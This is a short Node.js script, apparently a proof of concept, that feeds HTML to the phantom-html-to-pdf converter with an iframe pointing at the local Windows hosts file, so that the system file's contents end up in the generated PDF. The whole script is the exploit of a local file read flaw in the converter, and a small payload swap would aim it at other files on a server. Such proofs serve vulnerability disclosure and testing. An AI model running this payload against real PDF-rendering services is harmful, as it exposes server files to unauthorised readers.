var fs = require('fs')
var conversion = require("phantom-html-to-pdf")();
conversion({ html: "<h1>hello world</h1></br><iframe src=\"file:///C:/WINDOWS/system32/drivers/etc/hosts\"></iframe>" }, function(err, pdf) {
  var output = fs.createWriteStream('output.pdf')
  console.log(pdf.logs);
  console.log(pdf.numberOfPages);
    // since pdf.stream is a node.js stream you can use it
    // to save the pdf to a file (like in this example) or to
    // respond an http request.
  pdf.stream.pipe(output);
});